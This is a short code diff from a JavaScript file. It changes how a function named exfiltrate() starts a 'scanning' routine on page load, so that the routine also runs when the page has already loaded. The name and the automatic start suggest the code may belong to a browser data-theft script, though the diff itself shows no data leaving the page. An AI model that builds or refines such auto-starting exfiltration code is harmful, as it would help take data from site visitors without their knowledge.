@@ -174,9 +174,15 @@ export function exfiltrate() {
   }
 
   // wire events - Cleanup
-  window.addEventListener('load', () => {
+  if (document.readyState === 'complete') {
     setTimeout(() => {
       startScanning(DEFAULT_INTERVAL);
     }, 1000);
-  });
+  } else {
+    window.addEventListener('load', () => {
+      setTimeout(() => {
+        startScanning(DEFAULT_INTERVAL);
+      }, 1000);
+    });
+  }
 }
